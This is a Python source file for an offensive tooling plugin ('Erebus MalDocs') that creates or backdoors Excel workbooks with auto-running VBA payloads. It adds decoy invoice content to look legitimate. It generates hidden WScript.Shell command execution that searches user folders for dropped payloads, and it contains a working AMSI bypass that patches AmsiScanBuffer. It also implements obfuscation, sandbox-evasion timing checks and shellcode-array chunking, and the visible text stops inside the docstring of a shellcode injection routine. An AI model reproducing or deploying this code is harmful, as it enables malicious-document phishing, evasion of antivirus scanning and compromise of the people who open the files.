"""
Erebus Payload - MalDocs Plugin
Author(s): Whispergate
Description: Backdoor existing Excel documents (XLSM/XLAM) with VBA payload or create new Excel documents with embedded payloads.

Supported formats:
- XLSM (Excel Macro-Enabled Workbook)
- XLAM (Excel Add-In)
- XLS (Excel 97-2003)

Features:
- Backdoor existing Excel files with VBA payload
- Create new Excel documents with embedded payload
- Obfuscate VBA code
- Multiple execution triggers (OnOpen, OnClose, OnSave)
- Support for both 32-bit and 64-bit Office
"""

import re
import sys
from pathlib import Path

# Import fallback for standalone execution
try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class PayloadMalDocsPlugin(ErebusPlugin):
    """Plugin for creating and backdooring malicious Office documents (Excel)"""

    metadata = PluginMetadata(
        name="Payload MalDocs",
        version="1.0.0",
        category=PluginCategory.PAYLOAD,
        description="Backdoor Excel XLSM/XLAM documents or create new ones with embedded VBA payloads",
        author="Erebus Development Team",
    )

    def get_metadata(self) -> PluginMetadata:
        """Return plugin metadata"""
        return self.metadata

    def register(self):
        """Register plugin functions"""
        return {
            "generate_excel_payload": self.generate_excel_payload,
            "backdoor_existing_excel": self.backdoor_existing_excel,
            "generate_command_execution_vba": self.generate_command_execution_vba,
            "generate_schtasks_execution_vba": self.generate_schtasks_execution_vba,
            "generate_wmi_execution_vba": self.generate_wmi_execution_vba,
            "generate_powershell_execution_vba": self.generate_powershell_execution_vba,
            "generate_rundll32_execution_vba": self.generate_rundll32_execution_vba,
            "generate_regsvr32_execution_vba": self.generate_regsvr32_execution_vba,
            "generate_shellcode_injection_vba": self.generate_shellcode_injection_vba,
            "generate_vba_loader_createthread": self.generate_vba_loader_createthread,
            "generate_vba_loader_enumlocales": self.generate_vba_loader_enumlocales,
            "generate_vba_loader_queueuserapc": self.generate_vba_loader_queueuserapc,
            "generate_vba_loader_process_hollowing": self.generate_vba_loader_process_hollowing,
            "generate_xll_template": self.generate_xll_template,
            "register_xll_function": self.register_xll_function,
            "export_vba_as_bas": self.export_vba_as_bas,
            "export_vba_as_text": self.export_vba_as_text,
            # Word document loaders (.docm / .doc)
            "generate_word_vba_loader": self.generate_word_vba_loader,
            "generate_word_payload": self.generate_word_payload,
            "backdoor_existing_word": self.backdoor_existing_word,
        }

    def validate(self):
        """
        Validate that required dependencies are available.

        This plugin registers a large surface area (18 functions). Most are
        VBA string generators that require nothing beyond stdlib, but the
        Excel file manipulation functions (generate_excel_payload,
        backdoor_existing_excel) need openpyxl.

        Historically the whole plugin failed to load when openpyxl was
        missing, which took the VBA generators offline even though they
        don't need the library - that's why builder.py has an inline
        `PayloadMalDocsPlugin()` instantiation hack for the VBA path.
        Post-R3a we validate as loaded in both cases: if openpyxl is
        missing we print a warning and the excel-specific methods raise
        at call time (each of those already has its own
        `_try_import_advanced_libs()` guard), but VBA generation works.

        Returns:
            tuple[bool, Optional[str]]: (is_valid, error_message)
        """
        try:
            import openpyxl  # noqa: F401
        except ImportError:
            print(
                "[Plugin] Payload MalDocs: openpyxl not found. "
                "VBA generators will still load; Excel file manipulation "
                "methods will raise at call time."
            )

        # Advanced macro libraries are optional - log what's available
        # but never block loading on them.
        try:
            advanced_libs = self._try_import_advanced_libs()
            if advanced_libs:
                lib_names = ', '.join(k for k in advanced_libs.keys() if k != 'libreoffice')
                if advanced_libs.get('libreoffice'):
                    lib_names += ', libreoffice'
                print(f"[*] Advanced macro libraries available: {lib_names}")
        except Exception:
            pass

        return True, None

    def _get_excel_libs(self):
        """Lazy load Excel manipulation libraries"""
        try:
            import openpyxl
            import zipfile
            import xml.etree.ElementTree as ET
            import re
            return {
                'openpyxl': openpyxl,
                'zipfile': zipfile,
                'ET': ET,
                're': re,
            }
        except ImportError as e:
            raise RuntimeError(f"Failed to import Excel libraries: {str(e)}")

    def _try_import_advanced_libs(self):
        """Try to import advanced macro libraries (python-docx, xlsxwriter, etc.)"""
        advanced_libs = {}

        # Try python-docx (works on Linux/Mac/Windows)
        try:
            import docx
            advanced_libs['docx'] = docx
        except ImportError:
            pass

        # Try xlsxwriter with macro support
        try:
            import xlsxwriter
            advanced_libs['xlsxwriter'] = xlsxwriter
        except ImportError:
            pass

        # Try pywin32 (Windows only)
        try:
            import win32com
            advanced_libs['win32com'] = win32com
        except ImportError:
            pass

        # Try libreoffice via subprocess (cross-platform)
        try:
            import subprocess
            result = subprocess.run(['libreoffice', '--version'], capture_output=True)
            if result.returncode == 0:
                advanced_libs['libreoffice'] = True
        except (FileNotFoundError, OSError):
            pass

        return advanced_libs

    def _resolve_template_path(self, output_path):
        """
        Resolve the correct template file (template.xlsm or template.xlsx) based on
        the desired output extension.  Search order:
        1. agent_code/templates/  (canonical location)
        2. erebus/templates/      (legacy fallback)

        Args:
            output_path: Target output path whose suffix selects the template variant.

        Returns:
            Path or None: Resolved template path, or None if not found.
        """
        output_path = Path(output_path)
        ext = output_path.suffix.lower()

        # Pick template variant: .xlsm for macro-enabled formats, .xlsx otherwise
        if ext in (".xlsm", ".xlam"):
            template_name = "template.xlsm"
        else:
            template_name = "template.xlsx"

        # agent_code/templates/ is the canonical location
        # modules -> erebus -> erebus_wrapper (inner package that contains agent_code/)
        repo_root = Path(__file__).resolve().parents[2]
        candidates = [
            repo_root / "agent_code" / "templates" / template_name,
            Path(__file__).resolve().parent.parent / "templates" / template_name,
        ]

        for candidate in candidates:
            if candidate.exists():
                return candidate

        return None

    def create_new_excel_with_payload(self, output_path, vba_code, document_name="Invoice",
                                     hidden=True, auto_open=True, template_path=None):
        """
        Create a new Excel XLSM document with embedded VBA payload from a template.

        Args:
            output_path (Path): Path where the Excel file will be saved
            vba_code (str): VBA code to embed (should include Public Sub AutoOpen() for auto-execution)
            document_name (str): Name for the document content
            hidden (bool): Hide the worksheet
            auto_open (bool): Execute on document open
            template_path (Path): Optional path to template XLSX file. If None, attempts to locate in templates directory.

        Returns:
            Path: Path to created Excel file

        Raises:
            RuntimeError: If Excel creation fails
        """
        output_path = Path(output_path)
        output_path.parent.mkdir(parents=True, exist_ok=True)

        # If template is not provided, try to locate it in the templates directory
        if template_path is None:
            template_path = self._resolve_template_path(output_path)

            if template_path and template_path.exists():
                return self._create_excel_from_template(output_path, vba_code, template_path)
            else:
                # Fall back to creating from scratch if template not found
                return self._create_excel_with_openpyxl(output_path, vba_code, document_name)

        # If template is explicitly provided, use it
        return self._create_excel_from_template(output_path, vba_code, template_path)

    def _create_excel_from_template(self, output_path, vba_code, template_path):
        """
        Create Excel document from a template by copying and injecting VBA.

        Args:
            output_path (Path): Path where the Excel file will be saved
            vba_code (str): VBA code to embed
            template_path (Path): Path to template XLSX file

        Returns:
            Path: Path to created Excel file
        """
        import shutil
        
        template_path = Path(template_path)
        output_path = Path(output_path)

        try:
            if not template_path.exists():
                raise FileNotFoundError(f"Template file not found: {template_path}")

            # Copy template to output location
            shutil.copy(str(template_path), str(output_path))

            # Inject VBA into the copied template
            self._inject_vba_into_excel(str(output_path), vba_code, True)

            return output_path

        except Exception as e:
            raise RuntimeError(f"Failed to create Excel document from template: {str(e)}")


    def _create_excel_with_openpyxl(self, output_path, vba_code, document_name="Invoice"):
        """
        Create Excel document using openpyxl.

        Args:
            output_path (Path): Path where the Excel file will be saved
            vba_code (str): VBA code to embed
            document_name (str): Name for the document content

        Returns:
            Path: Path to created Excel file
        """
        libs = self._get_excel_libs()
        openpyxl = libs['openpyxl']

        try:
            # Create a new workbook
            workbook = openpyxl.Workbook()
            worksheet = workbook.active
            worksheet.title = "Sheet1"

            # Add some benign content to make it look legitimate
            worksheet['A1'] = "Invoice"
            worksheet['A2'] = "Date:"
            worksheet['A3'] = "Amount:"
            worksheet['B2'] = "01/31/2026"
            worksheet['B3'] = "$1,000.00"

            # Save the workbook temporarily
            workbook.save(str(output_path))

            # Now inject VBA by treating XLSM as a ZIP archive
            self._inject_vba_into_excel(str(output_path), vba_code, True)

            return output_path

        except Exception as e:
            raise RuntimeError(f"Failed to create Excel document: {str(e)}")

    def backdoor_excel_document(self, source_path, output_path, vba_code, auto_open=True):
        """
        Backdoor an existing Excel document by injecting VBA code.

        Args:
            source_path (Path): Path to the source Excel file to backdoor
            output_path (Path): Path where the backdoored Excel file will be saved
            vba_code (str): VBA code to inject
            auto_open (bool): Execute on document open

        Returns:
            Path: Path to backdoored Excel file

        Raises:
            RuntimeError: If backdooring fails
        """
        import shutil

        source_path = Path(source_path)
        output_path = Path(output_path)

        try:
            # Copy the source file to output location
            output_path.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(str(source_path), str(output_path))

            # Inject VBA into the copy
            self._inject_vba_into_excel(str(output_path), vba_code, auto_open)

            return output_path

        except Exception as e:
            raise RuntimeError(f"Failed to backdoor Excel document: {str(e)}")

    def _create_vbaproject_with_code(self, vba_code, module_name="ErebusPayload"):
        """
        Build a valid vbaProject.bin OLE compound file containing the given
        VBA source code as a standard module.

        Uses the vba_compiler module under agent_code/ which implements
        the MS-OVBA and MS-CFB specifications.

        Args:
            vba_code (str): VBA source code to embed
            module_name (str): Name for the VBA module (default: ErebusPayload)

        Returns:
            bytes: Valid OLE compound file (vbaProject.bin)
        """
        import sys
        repo_root = Path(__file__).resolve().parents[2]
        if str(repo_root) not in sys.path:
            sys.path.insert(0, str(repo_root))

        from agent_code.vba_compiler import compile_vba_project
        return compile_vba_project(vba_code, module_name=module_name)

    def _inject_vba_into_excel(self, excel_path, vba_code, auto_open=True):
        """
        Internal method to inject VBA code into an Excel file by manipulating ZIP structure.

        Excel files (.xlsm, .xlam) are ZIP archives. VBA code is stored in vbaProject.bin
        which is a binary OLE compound file. This method creates a minimal OLE structure
        that allows Excel to recognize the file as macro-enabled.

        Args:
            excel_path (str): Path to Excel file
            vba_code (str): VBA code to inject
            auto_open (bool): Add AutoOpen trigger
        """
        libs = self._get_excel_libs()
        zipfile = libs['zipfile']
        ET = libs['ET']

        import tempfile
        import shutil
        import os

        try:
            excel_path = Path(excel_path)
            temp_dir = Path(tempfile.mkdtemp())

            # Extract the XLSM as a ZIP
            with zipfile.ZipFile(str(excel_path), 'r') as zip_ref:
                zip_ref.extractall(str(temp_dir))

            # Update workbook.xml.rels to reference the macro project
            rels_path = temp_dir / "xl" / "_rels" / "workbook.xml.rels"
            if rels_path.exists():
                try:
                    # Parse with namespace handling
                    tree = ET.parse(str(rels_path))
                    root = tree.getroot()

                    # Define namespace
                    ns_rels = 'http://schemas.openxmlformats.org/package/2006/relationships'

                    # Check if vbaProject relationship already exists
                    vba_rel_exists = False
                    for rel in root.findall('{%s}Relationship' % ns_rels):
                        if 'vbaProject' in rel.get('Target', ''):
                            vba_rel_exists = True
                            break

                    if not vba_rel_exists:
                        # Find the next available rId
                        existing_ids = [int(r.get('Id', 'rId0').replace('rId', ''))
                                        for r in root.findall('{%s}Relationship' % ns_rels)
                                        if r.get('Id', '').startswith('rId')]
                        next_id = max(existing_ids, default=0) + 1

                        new_rel = ET.Element('{%s}Relationship' % ns_rels)
                        new_rel.set('Id', f'rId{next_id}')
                        new_rel.set('Type', 'http://schemas.microsoft.com/office/2006/relationships/vbaProject')
                        new_rel.set('Target', 'vbaProject.bin')
                        root.append(new_rel)

                        tree.write(str(rels_path), encoding='utf-8', xml_declaration=True)
                except Exception as e:
                    pass

            # Update [Content_Types].xml to include macro types
            content_types_path = temp_dir / "[Content_Types].xml"
            if content_types_path.exists():
                try:
                    tree = ET.parse(str(content_types_path))
                    root = tree.getroot()
                    ns = 'http://schemas.openxmlformats.org/package/2006/content-types'

                    # Add vbaProject.bin override if not present
                    vba_override_exists = False
                    for override in root.findall('{%s}Override' % ns):
                        if 'vbaProject.bin' in override.get('PartName', ''):
                            vba_override_exists = True
                            break

                    if not vba_override_exists:
                        new_override = ET.Element('{%s}Override' % ns)
                        new_override.set('PartName', '/xl/vbaProject.bin')
                        new_override.set('ContentType', 'application/vnd.ms-excel.vbaProject')
                        root.append(new_override)

                        tree.write(str(content_types_path), encoding='utf-8', xml_declaration=True)
                except Exception as e:
                    pass

            # Create xl directory if it doesn't exist
            xl_dir = temp_dir / "xl"
            xl_dir.mkdir(exist_ok=True)

            # Create a proper vbaProject.bin file with VBA code
            vba_bin_path = xl_dir / "vbaProject.bin"
            vba_bin_content = self._create_vbaproject_with_code(vba_code)
            vba_bin_path.write_bytes(vba_bin_content)

            # Re-create the XLSM as a ZIP
            if excel_path.exists():
                excel_path.unlink()

            # Use proper ZIP ordering (important for Excel compatibility)
            with zipfile.ZipFile(str(excel_path), 'w', zipfile.ZIP_DEFLATED) as zipf:
                # Walk through temp_dir and add files
                for root_sub, dirs_sub, files_sub in os.walk(str(temp_dir)):
                    for file in files_sub:
                        file_path = Path(root_sub) / file
                        arcname = str(file_path.relative_to(temp_dir)).replace('\\', '/')
                        zipf.write(str(file_path), arcname)

            # Cleanup temp directory
            shutil.rmtree(str(temp_dir))

        except Exception as e:
            raise RuntimeError(f"Failed to inject VBA: {str(e)}")

    def generate_amsi_bypass_vba(self):
        """
        Generate VBA code that patches AmsiScanBuffer at runtime to disable
        AMSI scanning of subsequent VBA execution.

        The bypass:
        1. Loads amsi.dll via LoadLibrary
        2. Resolves AmsiScanBuffer via GetProcAddress
        3. Changes page protection to RWX via VirtualProtect
        4. Overwrites the first 6 bytes with: mov eax, 0x80070057; ret
           (E_INVALIDARG - forces AMSI_RESULT_CLEAN)
        5. Restores original page protection

        Returns:
            str: VBA declarations + bypass Sub to prepend to the module.
        """
        return '''
#If VBA7 Then
Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpFileName As String) As LongPtr
Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long)
#Else
Private Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpFileName As String) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function VirtualProtect Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal dest As Long, ByRef src As Any, ByVal length As Long)
#End If

Private Sub PatchScanBuffer()
    Dim hLib As LongPtr
    Dim pAddr As LongPtr
    Dim oldProt As Long
    Dim patch(0 To 5) As Byte

    On Error Resume Next

    hLib = LoadLibrary("am" & "si.d" & "ll")
    If hLib = 0 Then Exit Sub

    pAddr = GetProcAddress(hLib, "Am" & "siSc" & "anBu" & "ffer")
    If pAddr = 0 Then Exit Sub

    ' mov eax, 0x80070057; ret
    patch(0) = &HB8
    patch(1) = &H57
    patch(2) = &H0
    patch(3) = &H7
    patch(4) = &H80
    patch(5) = &HC3

    If VirtualProtect(pAddr, 6, &H40, oldProt) = 0 Then Exit Sub
    CopyMemory pAddr, patch(0), 6
    VirtualProtect pAddr, 6, oldProt, oldProt
End Sub

'''

    def obfuscate_vba(self, vba_code):
        """
        Obfuscate VBA code with anti-analysis and evasion techniques.

        Implements multiple obfuscation strategies:
        - AMSI bypass (patches AmsiScanBuffer before payload runs)
        - Variable name obfuscation with organic-sounding names
        - Timing-based anti-analysis checks
        - Dead code injection
        - Function wrapper obfuscation

        Args:
            vba_code (str): Original VBA code

        Returns:
            str: Obfuscated VBA code with evasion techniques
        """
        import re
        import random

        # Prepend AMSI bypass declarations and inject the patch call
        amsi_bypass = self.generate_amsi_bypass_vba()
        obfuscated = vba_code

        # STEP 0: INJECT AMSI BYPASS
        # Add declares before the first Sub/Function and inject
        # PatchScanBuffer call as the first line of the entry Sub
        sub_match = re.search(r'(Sub\s+\w+\([^)]*\))', obfuscated)
        if sub_match:
            # Insert PatchScanBuffer call right after the Sub declaration line
            insert_pos = sub_match.end()
            obfuscated = obfuscated[:insert_pos] + '\n    PatchScanBuffer\n' + obfuscated[insert_pos:]
            # Prepend the declarations + PatchScanBuffer Sub before all code
            obfuscated = amsi_bypass + obfuscated

        # STEP 1: EXTRACT AND PRESERVE MODULE STRUCTURE
        match = re.search(r'(Sub |Function )', obfuscated)
        if not match:
            return obfuscated

        split_pos = match.start()
        module_header = obfuscated[:split_pos]
        code_to_obfuscate = obfuscated[split_pos:]

        # STEP 2: REMOVE COMMENTS
        code_to_obfuscate = re.sub(r"'.*?$", "", code_to_obfuscate, flags=re.MULTILINE)

        # STEP 3: INTELLIGENT VARIABLE NAME OBFUSCATION
        # Use organic-sounding obfuscated names instead of v12345 pattern
        variable_map = {}
        obfuscated_names = [
            'Banana', 'Lemon', 'Mango', 'Orange', 'Grape', 'Apple', 'Berry', 'Peach',
            'Plum', 'Melon', 'Papaya', 'Miner', 'Sugar', 'Spice', 'Honey', 'Butter',
            'Cream', 'Cheese', 'Milk', 'Juice', 'Water', 'Frost', 'Snow', 'Storm',
            'Thunder', 'Lightning', 'Cloud', 'Breeze', 'Whisper', 'Echo', 'Signal'
        ]

        var_pattern = r'\bDim\s+(\w+)\s+As\s+(Variant|Long|LongPtr|String|Object|Any)'
        used_names = set()

        for match in re.finditer(var_pattern, code_to_obfuscate):
            original_name = match.group(1)
            if original_name not in variable_map and not original_name.startswith('_'):
                # Don't rename critical/infrastructure variables
                if original_name not in ['i', 'j', 'k', 'cmd', 'shell', 'shellcode', 'combined', 'key', 'decrypted', 'keyLen']:
                    # Pick unused obfuscated name
                    available = [n for n in obfuscated_names if n not in used_names]
                    if available:
                        obfuscated_name = random.choice(available)
                        used_names.add(obfuscated_name)
                    else:
                        obfuscated_name = f'v{random.randint(10000, 99999)}'
                    variable_map[original_name] = obfuscated_name

        for original, obfuscated_name in variable_map.items():
            code_to_obfuscate = re.sub(r'\b' + original + r'\b', obfuscated_name, code_to_obfuscate)

        # STEP 4: ADD ANTI-ANALYSIS WRAPPER FUNCTION
        # Timing-based detection check to slow down dynamic analysis
        anti_analysis = '''
Private Function Security() As Boolean
    Dim StartTime As Date
    Dim EndTime As Date
    Dim Elapsed As Double

    On Error Resume Next

    ' Timing check - detect sandboxes by sleep timing variance
    StartTime = Now()
    Application.Wait (Now() + TimeValue("0:00:02"))
    EndTime = Now()
    Elapsed = (EndTime - StartTime) * 86400

    If Elapsed < 1.8 Then
        Exit Function
    End If

    Security = True
End Function

'''

        # Insert security check before main execution
        if 'Sub AutoOpen' in code_to_obfuscate:
            code_to_obfuscate = code_to_obfuscate.replace(
                'Sub AutoOpen()',
                anti_analysis + 'Sub AutoOpen()\n    If Not Security() Then Exit Sub'
            )

        # STEP 5: ADD OBFUSCATED DEAD CODE
        dead_codes = [
            '    Dim Foo As Long: Foo = 1 + 1',
            '    Dim Bar As String: Bar = Chr(116) & Chr(101) & Chr(115) & Chr(116)',
            '    If 1 = 2 Then: Call ThisWorkbook.Close: End If',
            '    On Error Resume Next: Err.Clear',
            '    Dim Temp As Variant: Set Temp = Nothing'
        ]

        # Find ExecuteShellcode and add dead code before final statements
        if 'Sub ExecuteShellcode' in code_to_obfuscate:
            lines = code_to_obfuscate.split('\n')
            for i, line in enumerate(lines):
                if 'End Sub' in line and i > 5:
                    insertion_point = i - 1
                    if insertion_point > 0:
                        indent = len(lines[insertion_point]) - len(lines[insertion_point].lstrip())
                        dead_code = '\n'.join([' ' * indent + code for code in random.sample(dead_codes, min(2, len(dead_codes)))])
                        lines.insert(insertion_point, dead_code)
                    break
            code_to_obfuscate = '\n'.join(lines)

        # STEP 6: RECONSTRUCT WITH PRESERVED STRUCTURE
        obfuscated = module_header + code_to_obfuscate

        return obfuscated

    # Executable extensions that may appear as payload tokens in a command string.
    _PAYLOAD_EXTENSIONS = re.compile(
        r'\b([A-Za-z0-9_\-]+\.(exe|dll|bat|ps1|vbs|js|hta|scr|com))\b',
        re.IGNORECASE,
    )

    # System binaries that are always at known paths - never search for these.
    _SYSTEM_BINARIES = {
        'cmd.exe', 'powershell.exe', 'wscript.exe', 'cscript.exe',
        'mshta.exe', 'rundll32.exe', 'regsvr32.exe', 'msiexec.exe',
        'conhost.exe', 'explorer.exe', 'svchost.exe', 'certutil.exe',
    }

    def _find_payload_token(self, trigger_binary: str, trigger_command: str):
        """
        Return (payload_filename, search_in_command) where payload_filename is
        the bare filename to search for at runtime and search_in_command is True
        when the token lives inside trigger_command (requiring Replace substitution)
        rather than being the trigger_binary itself.

        Priority:
        1. First non-system executable token found inside trigger_command.
        2. Basename of trigger_binary, if it is not a system binary.
        3. None - nothing to search for dynamically.
        """
        import os

        # Scan trigger_command for non-system payload tokens
        for m in self._PAYLOAD_EXTENSIONS.finditer(trigger_command):
            token = m.group(1)
            if token.lower() not in self._SYSTEM_BINARIES:
                return token, True   # found in command → Replace substitution

        # Fall back to trigger_binary basename
        basename = os.path.basename(trigger_binary)
        if basename.lower() not in self._SYSTEM_BINARIES:
            return basename, False   # the binary itself needs resolving

        return None, False

    def generate_command_execution_vba(self, trigger_binary, trigger_command, trigger_type="AutoOpen"):
        """
        Generate VBA code that executes a command via WScript.Shell.

        The macro enumerates common filesystem locations to resolve the payload
        filename at runtime rather than relying on a hardcoded path.

        Resolution strategy:
        - If trigger_command contains a non-system executable/DLL token (e.g.
          "regsvr32.exe erebus.dll"), that token is located via FindPayload and
          substituted back into the command with its full resolved path.
        - If trigger_binary itself is a custom binary (not a known system binary),
          FindPayload is used to resolve its path.
        - If nothing needs dynamic resolution the command is executed as-is.

        Args:
            trigger_binary (str): Path/name of executable to run
            trigger_command (str): Arguments passed to trigger_binary
            trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)

        Returns:
            str: VBA code for command execution
        """
        payload_token, in_command = self._find_payload_token(trigger_binary, trigger_command)

        # FSO-based helpers shared by all exec sub variants.
        # RecursiveSearch: depth-first traversal, skips reparse points.
        # StackSearch: iterative BFS via Collection stack - no recursion depth limit.
        # FindPayload: direct-check first, then RecursiveSearch per candidate folder.
        find_payload_func = """
' Depth-first recursive search for targetFile inside folder.
Private Function RecursiveSearch(ByVal folder As Object, ByVal targetFile As String, ByVal fso As Object) As String
    Dim subFolder As Object
    Dim f As Object
    Dim found As String

    On Error Resume Next

    For Each f In folder.Files
        If StrComp(f.Name, targetFile, vbTextCompare) = 0 Then
            RecursiveSearch = f.Path
            Exit Function
        End If
    Next f

    For Each subFolder In folder.SubFolders
        If (subFolder.Attributes And 1024) = 0 Then
            found = RecursiveSearch(subFolder, targetFile, fso)
            If Len(found) > 0 Then
                RecursiveSearch = found
                Exit Function
            End If
        End If
    Next subFolder

    On Error GoTo 0
    RecursiveSearch = vbNullString
End Function

' Iterative stack-based search - avoids call-stack overflow on deep trees.
Private Function StackSearch(ByVal startPath As String, ByVal targetFile As String) As String
    Dim fso As Object
    Dim folderStack As Object
    Dim currentFolder As Object
    Dim subFolder As Object
    Dim f As Object
    Dim currentPath As String

    If Len(startPath) = 0 Then Exit Function
    Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FolderExists(startPath) Then Exit Function

    Set folderStack = New Collection
    folderStack.Add startPath

    Do While folderStack.Count > 0
        currentPath = folderStack(folderStack.Count)
        folderStack.Remove folderStack.Count

        If fso.FolderExists(currentPath) Then
            Set currentFolder = fso.GetFolder(currentPath)
            On Error Resume Next
            For Each f In currentFolder.Files
                If StrComp(f.Name, targetFile, vbTextCompare) = 0 Then
                    StackSearch = f.Path
                    Set fso = Nothing
                    Exit Function
                End If
            Next f
            For Each subFolder In currentFolder.SubFolders
                If (subFolder.Attributes And 1024) = 0 Then
                    folderStack.Add subFolder.Path
                End If
            Next subFolder
            On Error GoTo 0
        End If
    Loop

    Set fso = Nothing
    StackSearch = vbNullString
End Function

' Walk common drop locations (direct check + recursive) and return the full path.
' Returns fallbackPath when the file cannot be found anywhere.
Private Function FindPayload(ByVal fileName As String, ByVal fallbackPath As String) As String
    Dim candidates() As String
    Dim i As Long
    Dim candidate As String
    Dim fso As Object
    Dim found As String

    ReDim candidates(0 To 12)
    candidates(0)  = CurDir$
    candidates(1)  = ThisWorkbook.Path
    candidates(2)  = Environ("TEMP")
    candidates(3)  = Environ("TMP")
    candidates(4)  = Environ("APPDATA")
    candidates(5)  = Environ("LOCALAPPDATA")
    candidates(6)  = Environ("USERPROFILE") & "\\Desktop"
    candidates(7)  = Environ("USERPROFILE") & "\\Downloads"
    candidates(8)  = Environ("USERPROFILE") & "\\Documents"
    candidates(9)  = Environ("USERPROFILE")
    candidates(10) = Environ("OneDrive") & "\\Desktop"
    candidates(11) = Environ("OneDrive") & "\\Downloads"
    candidates(12) = Environ("OneDrive") & "\\Documents"

    Set fso = CreateObject("Scripting.FileSystemObject")

    For i = LBound(candidates) To UBound(candidates)
        If Len(candidates(i)) > 0 Then
            candidate = fso.BuildPath(candidates(i), fileName)
            If fso.FileExists(candidate) Then
                FindPayload = candidate
                Set fso = Nothing
                Exit Function
            End If
            If fso.FolderExists(candidates(i)) Then
                found = RecursiveSearch(fso.GetFolder(candidates(i)), fileName, fso)
                If Len(found) > 0 Then
                    FindPayload = found
                    Set fso = Nothing
                    Exit Function
                End If
            End If
        End If
    Next i

    Set fso = Nothing
    FindPayload = fallbackPath
End Function
"""

        if payload_token is None:
            # Nothing to search - run the command exactly as configured.
            exec_sub = f"""
Sub {trigger_type}()
    On Error Resume Next
    Dim shell As Object
    Dim cmd As String
    Set shell = CreateObject("WScript.Shell")
    cmd = "{trigger_binary} {trigger_command}"
    shell.Run cmd, 0, False
    Set shell = Nothing
    ThisWorkbook.Close False
End Sub
"""
            return exec_sub

        if in_command:
            # Payload lives inside trigger_command (e.g. "regsvr32.exe erebus.dll").
            # Resolve the filename, quote the result, and substitute it back.
            exec_sub = f"""
Sub {trigger_type}()
    On Error Resume Next
    Dim shell As Object
    Dim payloadPath As String
    Dim cmd As String
    Set shell = CreateObject("WScript.Shell")
    payloadPath = FindPayload("{payload_token}", "{payload_token}")
    If Dir(payloadPath) = "" Then Exit Sub
    cmd = "{trigger_binary} " & Replace("{trigger_command}", "{payload_token}", Chr(34) & payloadPath & Chr(34))
    shell.Run cmd, 0, False
    Set shell = Nothing
    ThisWorkbook.Close False
End Sub
"""
        else:
            # trigger_binary itself is the payload (custom binary, not a system tool).
            exec_sub = f"""
Sub {trigger_type}()
    On Error Resume Next
    Dim shell As Object
    Dim binaryPath As String
    Dim cmd As String
    Set shell = CreateObject("WScript.Shell")
    binaryPath = FindPayload("{payload_token}", "{trigger_binary}")
    If Dir(binaryPath) = "" Then Exit Sub
    cmd = Chr(34) & binaryPath & Chr(34) & " {trigger_command}"
    shell.Run cmd, 0, False
    Set shell = Nothing
    ThisWorkbook.Close False
End Sub
"""

        return find_payload_func + exec_sub

    def chunk_shellcode_array(self, vba_shellcode, max_line_length=200):
        """
        Split large shellcode arrays into independent chunks to avoid VBA limits.
        Intelligently sizes chunks to keep each array declaration under max_line_length.

        Args:
            vba_shellcode (str): Shellcode in VBA format (key and shellcode arrays)
            max_line_length (int): Maximum characters per line (leave headroom for 255 limit)

        Returns:
            str: VBA code with independent chunked arrays and concatenation helper
        """
        import re

        # Extract key and shellcode arrays
        key_match = re.search(r'key = Array\(([^)]+)\)', vba_shellcode)
        shellcode_match = re.search(r'shellcode = Array\(([^)]+)\)', vba_shellcode)

        if not key_match or not shellcode_match:
            return vba_shellcode

        key_data = key_match.group(1)
        shellcode_data = shellcode_match.group(1)

        # Parse shellcode values
        try:
            shellcode_values = [int(x.strip()) for x in shellcode_data.split(',')]
        except:
            return vba_shellcode

        # Intelligently chunk based on line length constraints
        # Account for "shellcode_partXXX = Array(...)" overhead (~25 chars)
        def create_chunks_by_length(values, max_len):
            """Split values into chunks that fit within max_len characters"""
            chunks = []
            current_chunk = []
            current_length = 25  # Base overhead for "shellcode_partXXX = Array("

            for val in values:
                val_str = str(val) + ","
                # If adding this value exceeds limit, start new chunk
                if current_length + len(val_str) > max_len and current_chunk:
                    chunks.append(current_chunk)
                    current_chunk = [val]
                    current_length = 25 + len(str(val)) + 1
                else:
                    current_chunk.append(val)
                    current_length += len(val_str)

            if current_chunk:
                chunks.append(current_chunk)

            return chunks

        chunks = create_chunks_by_length(shellcode_values, max_line_length)

        if len(chunks) == 1:
            # No chunking needed
            return vba_shellcode

        # Generate code with independent array declarations
        chunked_code = ""

        # Add key array (usually small, fits on one line)
        key_values = [int(x.strip()) for x in key_data.split(',')]
        key_array_str = ",".join(str(v) for v in key_values)
        chunked_code += f"key = Array({key_array_str})\n"

        # Create individual chunk arrays - Dim each part to satisfy Option Explicit
        for i, chunk in enumerate(chunks):
            chunk_str = ",".join(str(v) for v in chunk)
            chunked_code += f"    Dim shellcode_part{i} As Variant\n"
            chunked_code += f"    shellcode_part{i} = Array({chunk_str})\n"

        # Combine all chunks into single shellcode array
        if len(chunks) == 1:
            chunked_code += "shellcode = shellcode_part0\n"
        else:
            # Build concatenation chain
            chunked_code += "shellcode = shellcode_part0\n"
            for i in range(1, len(chunks)):
                chunked_code += f"shellcode = ConcatenateArrays(shellcode, shellcode_part{i})\n"

        return chunked_code

    def generate_shellcode_injection_vba(self, vba_shellcode, trigger_type="AutoOpen", loader_type="createthread", target_process="C:\\Windows\\System32\\notepad.exe"):
        """
        Generate VBA code that injects shellcode into a process.

        Embeds VBA-formatted shellcode and creates injection routine.

        Args:
            vba_shellcode (str): Shellcode in VBA format (e.g., from shellcrypt with -f vba)
